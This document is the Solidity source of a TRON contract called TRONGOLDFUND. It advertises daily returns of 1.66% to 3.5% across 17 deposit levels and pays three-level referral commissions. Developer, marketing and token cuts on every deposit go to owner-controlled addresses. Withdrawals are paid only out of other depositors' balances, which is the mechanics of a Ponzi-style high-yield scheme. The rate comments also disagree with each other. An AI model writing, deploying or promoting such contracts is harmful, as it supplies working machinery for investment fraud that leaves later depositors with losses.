//SourceUnit: fund.sol

pragma solidity ^0.4.25;

contract TRONGOLDFUND {

    using SafeMath for uint256;


    uint256 public totalPlayers;
    uint256 public totalPayout;
    uint256 public minDepositSize = 10000000;//10000000
    uint256 public interestRateDivisor = 1000000000000;//1000000000000
    uint256 public marketingComission = 3;
    uint256 public devCommission = 5;
    uint256 public feedToTgolde = 5;
    uint256 public commissionDivisor = 100;
    uint256 public startTime = 1575152000;
    uint256 public tgoldeDividend = 0;

    address public owner;
    address devAddress;
    address marketingAddress;
    address tgoldeAddress;

    struct Player {
        uint256 trxDeposit;
        uint256 time;
        uint256 interestProfit;
        uint256 currLevel;
        uint256 affInvestTotal;
        uint256 affRewards;
        address affFrom;
        uint256 aff1sum; //3 level
        uint256 aff2sum;
        uint256 aff3sum;
    }

    //1.66%,1.76%,1.86%,1.96%,
    //2.08%,2.18%,2.28%,2.38%,
    //2.50%,2.60%,2.70%,2.80%,
    //2.92%,3.12%,3.22%,3.32 %,
    //3.5%
    struct Level {
        uint256 interest;    // interest per seconds %
        uint256 minInvestment;    // investment requirement
    }

    struct InvestHistory{
      address who;
      address referral;
      uint256 amount;
      uint256 time;
    }

    struct WithdrawHistory{
      address who;
      uint256 amount;
      uint256 time;
    }

    mapping(address => Player) public players;
    mapping(uint256 => address) public indexToPlayer;
    mapping(address => InvestHistory[]) private investHistorys;
    mapping(address => WithdrawHistory[]) private withdrawHistorys;
    mapping(uint256 => Level) private level_;

    event Deposit(address who, uint256 amount, uint256 time);
    event Withdraw(address who, uint256 amount, uint256 time);

    constructor(address _tgoldeAddress) public {

      level_[1] =  Level(192130,0);          //daily 1.66
      level_[2] =  Level(203703,2500000000); //daily 1.76
      level_[3] =  Level(215278,5000000000); //daily 1.86
      level_[4] =  Level(226852,7500000000); //daily 1.96

      level_[5] =  Level(240740,10000000000);  //daily 2.08
      level_[6] =  Level(252315,30000000000); //daily 2.18
      level_[7] =  Level(263888,50000000000); //daily 2.28
      level_[8] =  Level(275463,70000000000); //daily 2.38

      level_[9] =  Level(289352,90000000000); //daily 2.50
      level_[10] = Level(300927,180000000000); //daily 2.60
      level_[11] = Level(312500,270000000000); //daily 2.70
      level_[12] = Level(324073,360000000000); //daily 2.80

      level_[13] = Level(337963,450000000000); //daily 2.92
      level_[14] = Level(349512,600000000000); //daily 3.02
      level_[15] = Level(361112,750000000000); //daily 3.12
      level_[16] = Level(372685,900000000000); //daily 3.22

      level_[17] = Level(405093,1200000000000); //daily 3.5

      owner = msg.sender;
      devAddress = msg.sender;
      marketingAddress = msg.sender;
      tgoldeAddress = _tgoldeAddress;
    }

    function calculateCurrLevel(address _addr) private{

      uint256 totalInvestment = players[_addr].trxDeposit;
      uint256 totalAmount = totalInvestment.add(players[_addr].affInvestTotal);

      if(totalAmount < level_[2].minInvestment){
        players[_addr].currLevel = 1;
      }
      else if(totalAmount < level_[3].minInvestment){
        players[_addr].currLevel = 2;
      }
      else if(totalAmount < level_[4].minInvestment){
        players[_addr].currLevel = 3;
      }
      else if(totalAmount < level_[5].minInvestment){
        players[_addr].currLevel = 4;
      }
      else if(totalAmount < level_[6].minInvestment){
        players[_addr].currLevel = 5;
      }
      else if(totalAmount < level_[7].minInvestment){
        players[_addr].currLevel = 6;
      }
      else if(totalAmount < level_[8].minInvestment){
        players[_addr].currLevel = 7;
      }
      else if(totalAmount < level_[9].minInvestment){
        players[_addr].currLevel = 8;
      }
      else if(totalAmount < level_[10].minInvestment){
        players[_addr].currLevel = 9;
      }
      else if(totalAmount < level_[11].minInvestment){
        players[_addr].currLevel = 10;
      }
      else if(totalAmount < level_[12].minInvestment){
        players[_addr].currLevel = 11;
      }
      else if(totalAmount < level_[13].minInvestment){
        players[_addr].currLevel = 12;
      }
      else if(totalAmount < level_[14].minInvestment){
        players[_addr].currLevel = 13;
      }
      else if(totalAmount < level_[15].minInvestment){
        players[_addr].currLevel = 14;
      }
      else if(totalAmount < level_[16].minInvestment){
        players[_addr].currLevel = 15;
      }
      else if(totalAmount < level_[17].minInvestment){
        players[_addr].currLevel = 16;
      }
      else{
        players[_addr].currLevel = 17;
      }
    }

    function calculateReferral(address _addr, uint256 _value) private{
      address _affAddr1 = players[_addr].affFrom;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;

      players[_affAddr1].affInvestTotal = players[_affAddr1].affInvestTotal.add((_value.mul(4)).div(10));
      calculateCurrLevel(_affAddr1);
      players[_affAddr2].affInvestTotal = players[_affAddr2].affInvestTotal.add((_value.mul(2)).div(10));
      calculateCurrLevel(_affAddr2);
      players[_affAddr3].affInvestTotal = players[_affAddr3].affInvestTotal.add((_value.mul(1)).div(10));
      calculateCurrLevel(_affAddr3);
    }

    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;

      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
      indexToPlayer[totalPlayers] = _addr;
    }

    function () external payable {

    }

    function whiteList(address _affAddr) public{
      Player storage player = players[msg.sender];
      if (player.time == 0) {
          player.time = now;
          totalPlayers++;
          if(_affAddr != address(0) && _affAddr != msg.sender){
            register(msg.sender, _affAddr);
          }
          else{
            register(msg.sender, owner);
          }
      }
    }

    function deposit(address _affAddr) public payable {
        require(now >= startTime);
        collect(msg.sender);
        require(msg.value >= minDepositSize);
        uint256 depositAmount = msg.value;

        Player storage player = players[msg.sender];
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && _affAddr != msg.sender){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }

        calculateReferral(msg.sender, msg.value);

        calculateCurrLevel(msg.sender);

        distributeRef(msg.value, player.affFrom);

        uint256 devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        devAddress.transfer(devEarn);
        uint256 marketingReserve = depositAmount.mul(marketingComission).div(commissionDivisor);
        marketingAddress.transfer(marketingReserve);
        uint256 tgoldeReserve = depositAmount.mul(feedToTgolde).div(commissionDivisor);
        tgoldeAddress.transfer(tgoldeReserve);
        tgoldeDividend = tgoldeDividend.add(tgoldeReserve);
        investHistorys[msg.sender].push(InvestHistory(msg.sender,player.affFrom,depositAmount,now));

        emit Deposit(msg.sender, depositAmount, now);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);

    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(depositAmount >= minDepositSize);
      require(contractBalance() >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
      calculateCurrLevel(msg.sender);

      distributeRef(depositAmount, player.affFrom);

      uint256 devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
      devAddress.transfer(devEarn);
      uint256 marketingReserve = depositAmount.mul(marketingComission).div(commissionDivisor);
      marketingAddress.transfer(marketingReserve);
      uint256 tgoldeReserve = depositAmount.mul(feedToTgolde).div(commissionDivisor);
      tgoldeAddress.transfer(tgoldeReserve);
      tgoldeDividend = tgoldeDividend.add(tgoldeReserve);
      investHistorys[msg.sender].push(InvestHistory(msg.sender,player.affFrom,depositAmount,now));
    }

    function ownerZeroouttGoldeDividend() public {
      require(msg.sender == owner);
      tgoldeDividend = 0;
    }

    function whiteListMigration(address _addr, address _affAddr) public{
      require(msg.sender == owner);
      Player storage player = players[_addr];
      if (player.time == 0) {
          player.time = now;
          totalPlayers++;
          if(_affAddr != address(0) && _affAddr != _addr){
            register(_addr, _affAddr);
          }
          else{
            register(_addr, owner);
          }
      }
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];
        if(player.trxDeposit >0){
          uint256 secondsPassed =  now.sub(player.time);
          if (secondsPassed > 0 && player.time > 0) {
              uint256 collectProfit = (player.trxDeposit.mul(secondsPassed.mul(level_[player.currLevel].interest))).div(interestRateDivisor);
              player.interestProfit = player.interestProfit.add(collectProfit);
              player.time = player.time.add(secondsPassed);
          }
        }
        else if(player.time > 0){
          player.time = now;
        }

    }

    function transferPayout(address _receiver, uint256 _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint256 contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint256 payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
                withdrawHistorys[msg.sender].push(WithdrawHistory(msg.sender,payout,now));

                emit Withdraw(_receiver,payout, now);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(7)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(4)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            _affAddr1.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            _affAddr2.transfer(_affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            _affAddr3.transfer(_affRewards);
       }

        if(_allaff > 0 ){
            owner.transfer(_allaff);
        }
    }

    function getProfit(address _addr) public view returns (uint256,uint256) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

      uint256 secondsPassed = now.sub(player.time);
      if (secondsPassed > 0) {
          uint256 collectProfit = (player.trxDeposit.mul(secondsPassed.mul(level_[player.currLevel].interest))).div(interestRateDivisor);
      }
      return (collectProfit.add(player.interestProfit),now);
    }

    function contractBalance() public view returns (uint256){
      return address(this).balance;
    }

    function getPlayer(address _addr) public view returns (uint256, uint256, uint256, uint256){
      return (players[_addr].trxDeposit,players[_addr].time,players[_addr].currLevel,players[_addr].affInvestTotal);
    }

    function getInvestHistorys(address _addr) public view returns (address[] memory, address[] memory, uint256[] memory, uint256[] memory) {
        uint256 size = investHistorys[_addr].length;
        if(size > 256){
          size = 256;
        }
        address[] memory addresses = new address[](size);
        address[] memory affAddresses = new address[](size);
        uint256[] memory amounts = new uint256[](size);
        uint256[] memory times = new uint256[](size);
        for (uint256 i = 0; i < size; i++) {
            InvestHistory storage invest = investHistorys[_addr][i];
            addresses[i] = invest.who;
            affAddresses[i] = invest.referral;
            amounts[i] = invest.amount;
            times[i] = invest.time;
        }
        return
        (
        addresses,
        affAddresses,
        amounts,
        times
        );
    }

    function getWithdrawHistorys(address _addr) public view returns (address[] memory, uint256[] memory, uint256[] memory) {
        uint256 size = withdrawHistorys[_addr].length;
        if(size > 256){
          size = 256;
        }
        address[] memory addresses = new address[](size);
        uint256[] memory amounts = new uint256[](size);
        uint256[] memory times = new uint256[](size);
        for (uint256 i = 0; i < size; i++) {
            WithdrawHistory storage withdrawRecord = withdrawHistorys[_addr][i];
            addresses[i] = withdrawRecord.who;
            amounts[i] = withdrawRecord.amount;
            times[i] = withdrawRecord.time;
        }
        return
        (
        addresses,
        amounts,
        times
        );
    }

}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}